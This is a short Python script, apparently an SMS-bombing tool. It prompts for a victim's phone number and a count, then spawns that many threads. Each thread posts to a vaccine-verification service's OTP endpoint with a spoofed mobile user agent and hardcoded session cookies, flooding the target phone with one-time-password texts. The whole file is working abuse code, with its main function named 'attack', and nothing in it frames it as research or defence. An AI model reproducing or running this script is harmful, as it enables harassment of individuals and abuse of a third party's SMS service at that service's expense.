import requests,json
import threading
import colorama

phone = input("PHONE : ")
number = int (input("NUMBER : "))

def attack():
    r = requests.post("https://vaccine.trueid.net/vacc-verify/api/getotp",json={"msisdn":f"{phone}","function":"enroll"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "visid_incap_2104120=FpehtdvzRDuqWIUnbb2obcmSJ2IAAAAAQUIPAAAAAABOfPmHrdd2l1h5JKcTW+MB;tids=bsdi3vf25ea3jinbn8f4r596jpdeqeer;_ga_id=1558776998.1646760667;_gcl_au=1.1.1142664624.1646763274;_ga=GA1.2.1363432684.1646763274;_gid=GA1.2.2042579673.1646763275;_gat_UA-86733131-1=1;_cbclose=1;_cbclose26068=1;_uid26068=B14BC6DC.1;_ctout26068=1;verify=test;_fbp=fb.1.1646763276347.768942143;OptanonAlertBoxClosed=2022-03-08T18:14:39.934Z;OptanonConsent=isIABGlobal=false&datestamp=Wed+Mar+09+2022+01%3A14%3A39+GMT%2B0700+(%E0%B9%80%E0%B8%A7%E0%B8%A5%E0%B8%B2%E0%B8%AD%E0%B8%B4%E0%B8%99%E0%B9%82%E0%B8%94%E0%B8%88%E0%B8%B5%E0%B8%99)&version=6.13.0&hosts=&landingPath=NotLandingPage&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1%2CC0005%3A1;_ga_R05PJC3ZG8=GS1.1.1646763273.1.1.1646763285.48"})
    if r.status_code == 200:
        print("SEND TO SMS")
    else:
        print("ERROR 404")
        
for i in range(number):
    threading.Thread(target=attack).start()